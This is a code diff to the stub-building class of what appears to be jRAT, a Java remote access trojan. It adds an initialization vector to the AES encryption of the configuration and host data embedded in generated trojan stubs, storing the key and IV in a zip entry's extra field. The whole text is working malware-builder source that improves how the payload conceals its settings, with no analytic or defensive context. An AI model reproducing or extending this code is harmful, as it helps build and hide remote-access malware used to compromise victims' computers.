@@ -22,6 +22,7 @@ import javax.crypto.Cipher;
 import javax.crypto.CipherOutputStream;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
+import javax.crypto.spec.IvParameterSpec;
 
 import jrat.api.utils.JarUtils;
 import se.jrat.client.BuildStatus;
@@ -81,6 +82,7 @@ public class Build {
 	        keyGen.init(128);
 	        SecretKey secretKey = keyGen.generateKey();
 	        byte[] key = secretKey.getEncoded();
+	        IvParameterSpec iv = CryptoUtils.getRandomIv();
 
 			File output;		
 
@@ -124,7 +126,7 @@ public class Build {
 			}
 
 			try {
-				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey);
+				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
 				ByteArrayOutputStream baos = new ByteArrayOutputStream();
 				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
 				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));
@@ -193,7 +195,10 @@ public class Build {
 
 				entry = new ZipEntry("config.dat");
 				outputStub.putNextEntry(entry);
-				entry.setExtra(key);
+				byte[] keyIv = new byte[key.length + iv.getIV().length];
+				System.arraycopy(key, 0, keyIv, 0, key.length);
+				System.arraycopy(iv.getIV(), 0, keyIv, 16, iv.getIV().length);
+				entry.setExtra(keyIv);
 				
 				outputStub.write(baos.toByteArray());
 				
@@ -207,7 +212,7 @@ public class Build {
 			}
 			
 			if (edithost) {
-				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey);
+				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
 				ByteArrayOutputStream baos = new ByteArrayOutputStream();
 				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
 				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));
@@ -230,7 +235,7 @@ public class Build {
 				outputStub.putNextEntry(entry);
 
 				
-				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey);
+				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
 				ByteArrayOutputStream baos = new ByteArrayOutputStream();
 				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
 				
